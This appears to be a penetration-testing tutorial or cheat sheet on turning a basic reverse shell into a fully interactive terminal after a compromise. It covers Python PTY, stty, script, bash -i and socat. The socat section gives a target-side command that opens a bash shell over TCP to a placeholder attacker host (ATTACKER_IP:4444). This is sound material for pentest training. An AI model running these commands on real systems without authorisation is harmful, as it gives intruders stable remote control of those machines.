# Shell Upgrade Techniques (TTY Upgrade)

During post-exploitation, the reverse shell obtained is often a **non-interactive shell**, meaning many terminal features are unavailable. Upgrading the shell provides a more stable and fully interactive terminal, making post-exploitation significantly easier.

---

# Method 1: Python PTY (Most Common)

If Python is installed on the target machine, you can spawn an interactive Bash shell using:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Or, if Python 3 is available:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### What does it do?

- Converts the current shell into an interactive shell.
- Enables command history.
- Improves `Ctrl + C` behavior.
- Supports `Tab` completion.
- Allows commands such as `clear` to work correctly.

---

# Method 2: Upgrade to a Full TTY

After spawning a PTY shell, suspend the session by pressing:

```text
CTRL + Z
```

On your attacking machine, execute:

```bash
stty raw -echo; fg
```

Press **Enter** twice.

Then, inside the upgraded shell, run:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

### Explanation

- `reset` initializes a proper terminal.
- `export TERM=xterm` enables terminal features such as colors and screen clearing.
- `stty rows` and `columns` adjust the terminal size to match your local terminal.

This method provides an experience very close to a normal SSH session.

---

# Method 3: Using the `script` Command

If the `script` utility is installed:

```bash
script /dev/null -c bash
```

Or:

```bash
script -qc /bin/bash /dev/null
```

### Advantages

- Creates a pseudo-terminal (PTY).
- Improves shell stability.
- Enables interactive terminal features.

---

# Method 4: Interactive Bash

If Bash exists on the target:

```bash
bash -i
```

### Advantages

- Starts an interactive Bash session.
- Slightly improves shell usability.
- Simple and commonly available.

---

# Method 5: Interactive SH

If Bash is unavailable:

```bash
sh -i
```

### Advantages

- Provides a basic interactive shell.
- Useful on minimal Linux installations.

---

# Method 6: Using Socat (Best Method)

If `socat` is installed on both the attacker and target machines, it can provide a fully interactive and highly stable shell.

### On the Attacker Machine

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### On the Target Machine

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

### Advantages

- Full TTY support.
- Stable interactive shell.
- Proper handling of `Ctrl + C`.
- Command history.
- Tab completion.
- Closest experience to an SSH session.

---

# Which Method Should You Use?

| Method | Stability | Requires |
|---------|-----------|-----------|
| Python PTY | ⭐⭐⭐⭐ | Python or Python3 |
| Full TTY (`stty`) | ⭐⭐⭐⭐⭐ | Python PTY |
| script | ⭐⭐⭐⭐ | `script` utility |
| bash -i | ⭐⭐ | Bash |
| sh -i | ⭐ | SH |
| Socat | ⭐⭐⭐⭐⭐ | Socat installed on both systems |

---

# Summary

The most commonly used shell upgrade techniques during penetration testing are:

1. **Python PTY** – The quickest and most widely used method.
2. **Full TTY (`stty`)** – Provides a fully interactive terminal after using Python PTY.
3. **script** – Creates a pseudo-terminal when available.
4. **bash -i / sh -i** – Simple methods for basic shell interaction.
5. **Socat** – The most powerful option, offering a stable shell nearly identical to an SSH session.